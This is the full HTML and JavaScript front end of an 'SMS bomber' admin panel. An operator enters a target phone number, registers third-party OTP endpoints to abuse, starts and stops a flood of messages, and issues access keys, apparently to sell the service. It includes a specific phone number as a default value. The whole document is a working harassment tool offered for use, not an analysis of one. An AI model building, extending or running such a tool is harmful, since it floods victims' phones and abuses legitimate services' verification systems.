<!DOCTYPE html>
<html>
<head>
    <title>💀 SMS BOMBER ADMIN</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { border-bottom: 2px solid #00ff00; padding-bottom: 10px; margin-bottom: 20px; }
        .header h1 { color: #ff0000; font-size: 2em; }
        .card { background: #111; border: 1px solid #333; border-radius: 10px; padding: 20px; margin-bottom: 20px; }
        .row { display: flex; gap: 20px; flex-wrap: wrap; }
        .col { flex: 1; min-width: 300px; }
        input, textarea, select { width: 100%; padding: 10px; background: #1a1a1a; border: 1px solid #333; color: #00ff00; border-radius: 5px; font-family: monospace; }
        button { background: #00ff00; color: #000; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
        button:hover { background: #00cc00; }
        .btn-danger { background: #ff0000; color: #fff; }
        .btn-danger:hover { background: #cc0000; }
        .btn-warning { background: #ff6600; color: #fff; }
        .btn-warning:hover { background: #cc5500; }
        .btn-success { background: #00cc44; color: #fff; }
        .btn-success:hover { background: #009933; }
        .status.active { color: #00ff00; }
        .status.inactive { color: #ff0000; }
        .request-item { background: #1a1a1a; padding: 15px; margin-bottom: 10px; border-radius: 5px; border-left: 4px solid #ff6600; }
        .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; }
        .stat-box { background: #1a1a1a; padding: 15px; border-radius: 5px; text-align: center; }
        .stat-box .number { font-size: 2em; color: #ff6600; }
        .stat-box .label { color: #888; font-size: 0.8em; }
        #log { background: #0a0a0a; padding: 10px; border-radius: 5px; height: 300px; overflow-y: auto; font-size: 0.8em; font-family: monospace; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>💀 DEVILS WILL RISE — SMS BOMBER</h1>
        <span>Owner: @gaurav_beniwal_0001 | Channel: @gaurav_beni_0001</span>
    </div>

    <!-- Stats -->
    <div class="card">
        <h3>📊 SYSTEM STATS</h3>
        <div class="stats-grid" id="statsGrid">
            <div class="stat-box"><div class="number" id="totalRequests">0</div><div class="label">Total Requests</div></div>
            <div class="stat-box"><div class="number" id="activeRequests">0</div><div class="label">Active Requests</div></div>
            <div class="stat-box"><div class="number" id="successCount">0</div><div class="label">Success</div></div>
            <div class="stat-box"><div class="number" id="failedCount">0</div><div class="label">Failed</div></div>
        </div>
    </div>

    <div class="row">
        <!-- Target & Controls -->
        <div class="col">
            <div class="card">
                <h3>🎯 TARGET</h3>
                <input type="text" id="targetPhone" placeholder="Enter phone number">
                <br><br>
                <button onclick="startBomb()" class="btn-success" id="startBtn">🚀 START BOMBING</button>
                <button onclick="stopBomb()" class="btn-danger" id="stopBtn" style="display:none;">⏹️ STOP</button>
                <div id="bombStatus" style="margin-top:10px;"></div>
            </div>

            <div class="card">
                <h3>🔑 API KEYS</h3>
                <input type="text" id="apiKey" placeholder="Enter API Key">
                <br><br>
                <label>Expiry:</label>
                <select id="keyExpiry">
                    <option value="3600">1 Hour</option>
                    <option value="86400">1 Day</option>
                    <option value="604800">1 Week</option>
                    <option value="0">Unlimited</option>
                </select>
                <br><br>
                <button onclick="generateKey()">🔑 GENERATE KEY</button>
                <button onclick="revokeKey()" class="btn-danger">🗑️ REVOKE</button>
            </div>
        </div>

        <!-- Add Request -->
        <div class="col">
            <div class="card">
                <h3>📥 ADD REQUEST</h3>
                <label>Name:</label>
                <input type="text" id="reqName" placeholder="e.g., Testbook OTP">
                <br><br>
                <label>URL (use {phone} placeholder):</label>
                <input type="text" id="reqUrl" placeholder="https://api.example.com/otp?phone={phone}">
                <br><br>
                <label>Method:</label>
                <select id="reqMethod"><option>POST</option><option>GET</option></select>
                <br><br>
                <label>Headers (JSON):</label>
                <textarea id="reqHeaders" placeholder='{"Content-Type": "application/json"}'></textarea>
                <br><br>
                <label>Body (JSON or raw):</label>
                <textarea id="reqBody" placeholder='{"phone": "{phone}"}'></textarea>
                <br><br>
                <label>Phone Variations (comma):</label>
                <input type="text" id="reqPhones" value="9729480795,+919729480795">
                <br><br>
                <button onclick="addRequest()">➕ ADD REQUEST</button>
            </div>
        </div>
    </div>

    <!-- Requests List -->
    <div class="card">
        <h3>📋 ACTIVE REQUESTS</h3>
        <div id="requestList"></div>
    </div>

    <!-- Logs -->
    <div class="card">
        <h3>📜 LIVE LOGS</h3>
        <div id="log"></div>
    </div>
</div>

<script>
const API_BASE = window.location.origin + '/api';

// ===== STATS =====
async function loadStats() {
    try {
        const res = await fetch(API_BASE + '/stats');
        const data = await res.json();
        document.getElementById('totalRequests').textContent = data.total_requests || 0;
        document.getElementById('activeRequests').textContent = data.active_requests || 0;
        document.getElementById('successCount').textContent = data.usage?.success || 0;
        document.getElementById('failedCount').textContent = data.usage?.failed || 0;
    } catch(e) {}
}

// ===== REQUESTS =====
async function loadRequests() {
    try {
        const res = await fetch(API_BASE + '/requests');
        const data = await res.json();
        renderRequests(data);
    } catch(e) {}
}

function renderRequests(requests) {
    const container = document.getElementById('requestList');
    if (!requests || requests.length === 0) {
        container.innerHTML = '<p style="color: #888;">No requests. Add one above!</p>';
        return;
    }
    container.innerHTML = requests.map((req, idx) => `
        <div class="request-item">
            <div style="display: flex; justify-content: space-between;">
                <strong>${req.name}</strong>
                <span>
                    <span class="status ${req.active ? 'active' : 'inactive'}">${req.active ? '✅ ACTIVE' : '⛔ INACTIVE'}</span>
                    <button onclick="toggleRequest(${idx})" style="margin-left:10px;">${req.active ? '⏸️' : '▶️'}</button>
                    <button onclick="deleteRequest(${idx})" class="btn-danger" style="margin-left:5px;">🗑️</button>
                </span>
            </div>
            <div style="font-size:0.8em;color:#888;">${req.method} | ${req.url}</div>
        </div>
    `).join('');
}

async function addRequest() {
    const name = document.getElementById('reqName').value.trim();
    const url = document.getElementById('reqUrl').value.trim();
    const method = document.getElementById('reqMethod').value;
    const headers = document.getElementById('reqHeaders').value.trim();
    const body = document.getElementById('reqBody').value.trim();
    const phones = document.getElementById('reqPhones').value.split(',').map(p=>p.trim()).filter(p=>p);
    if (!name || !url || !phones.length) { alert('Name, URL, and phones required!'); return; }
    try {
        const res = await fetch(API_BASE + '/requests', {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({
                name, url, method,
                headers: headers ? JSON.parse(headers) : {},
                body: body || '{}',
                phones
            })
        });
        const data = await res.json();
        if (data.success) { alert('✅ Added!'); loadRequests(); }
    } catch(e) { alert('❌ Error: '+e.message); }
}

async function toggleRequest(idx) {
    try {
        const res = await fetch(API_BASE + '/requests/'+idx+'/toggle', {method:'PUT'});
        if (res.ok) loadRequests();
    } catch(e) {}
}

async function deleteRequest(idx) {
    if (!confirm('Delete?')) return;
    try {
        await fetch(API_BASE + '/requests/'+idx, {method:'DELETE'});
        loadRequests();
    } catch(e) {}
}

// ===== BOMBING =====
async function startBomb() {
    const phone = document.getElementById('targetPhone').value.trim();
    const key = document.getElementById('apiKey').value.trim();
    if (!phone) { alert('Enter phone number!'); return; }
    if (!key) { alert('Enter API key!'); return; }
    
    try {
        const res = await fetch(API_BASE + '/bomb/start', {
            method: 'POST',
            headers: {'Content-Type':'application/json', 'X-API-Key': key},
            body: JSON.stringify({phone})
        });
        const data = await res.json();
        if (data.success) {
            document.getElementById('startBtn').style.display = 'none';
            document.getElementById('stopBtn').style.display = 'inline-block';
            document.getElementById('bombStatus').innerHTML = `🟢 Bombing active on ${phone}`;
            addLog(`🚀 Bombing started on ${phone}`);
            loadStats();
        } else {
            alert('❌ '+data.error);
        }
    } catch(e) { alert('❌ Error: '+e.message); }
}

async function stopBomb() {
    const key = document.getElementById('apiKey').value.trim();
    if (!key) { alert('Enter API key!'); return; }
    try {
        const res = await fetch(API_BASE + '/bomb/stop', {
            method: 'POST',
            headers: {'Content-Type':'application/json', 'X-API-Key': key}
        });
        const data = await res.json();
        if (data.success) {
            document.getElementById('startBtn').style.display = 'inline-block';
            document.getElementById('stopBtn').style.display = 'none';
            document.getElementById('bombStatus').innerHTML = `⏹️ Stopped | ${data.stats.total_requests} requests sent`;
            addLog(`⏹️ Bombing stopped`);
            loadStats();
        }
    } catch(e) {}
}

// ===== KEYS =====
async function generateKey() {
    const expiry = parseInt(document.getElementById('keyExpiry').value);
    try {
        const res = await fetch(API_BASE + '/keys', {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({expiry})
        });
        const data = await res.json();
        if (data.success) {
            document.getElementById('apiKey').value = data.key;
            alert('✅ Key: '+data.key);
        }
    } catch(e) { alert('❌ '+e.message); }
}

async function revokeKey() {
    const key = document.getElementById('apiKey').value.trim();
    if (!key || !confirm('Revoke this key?')) return;
    try {
        const res = await fetch(API_BASE + '/keys/'+key, {method:'DELETE'});
        if (res.ok) {
            document.getElementById('apiKey').value = '';
            alert('✅ Revoked');
        }
    } catch(e) {}
}

// ===== LOGS =====
function addLog(msg) {
    const log = document.getElementById('log');
    log.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}\n` + log.innerHTML;
    if (log.children.length > 50) log.removeChild(log.lastChild);
}

// ===== POLLING =====
setInterval(() => {
    loadStats();
    // Check bombing status
    fetch(API_BASE + '/bomb/status').then(res => res.json()).then(data => {
        if (data.active) {
            document.getElementById('startBtn').style.display = 'none';
            document.getElementById('stopBtn').style.display = 'inline-block';
        }
    }).catch(() => {});
}, 3000);

// ===== INIT =====
loadRequests();
loadStats();
</script>
</body>
</html>
